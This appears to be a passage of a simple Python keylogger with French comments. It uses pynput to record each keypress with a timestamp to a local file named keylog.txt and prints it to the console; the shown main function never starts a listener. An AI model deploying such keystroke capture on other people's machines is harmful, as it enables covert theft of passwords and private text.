from pynput import keyboard
import time

def on_key_press(key):
    try:
        # Ouverture du fichier en mode append (ajout) pour enregistrer les touches
        with open("keylog.txt", "a") as log_file:
            # Enregistrer l'heure du pressage de la touche
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            # Enregistrement de la touche avec l'horodatage
            log_file.write(f"{timestamp} - {key}\n")
            print(f"Key logged: {key}")  # Message pour débogage
    except Exception as e:
        print(f"Error logging key: {e}")

def main():
    print("Press Ctrl+C to stop logging.")